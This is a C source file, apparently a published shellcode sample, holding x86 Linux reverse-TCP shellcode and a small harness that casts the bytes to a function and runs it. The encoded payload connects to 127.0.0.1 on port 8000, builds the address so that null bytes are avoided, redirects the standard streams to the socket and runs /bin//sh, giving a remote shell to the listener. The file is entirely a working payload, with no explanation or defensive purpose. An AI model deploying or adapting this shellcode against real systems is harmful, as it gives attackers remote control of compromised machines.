// shell_reverse_tcp shellcode
// Author: buffered4ever
// 15-03-2019

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\x31\xc0\xb0\x66\x31\xdb\xb3\x01\xcd\x80\x89\xc7\x31\xdb\xbb\x90\x11\x11\x12\x81\xeb\x11\x11\x11\x11\x53\x66\x68\x1f\x40\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc2\x89\xc1\xb0\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

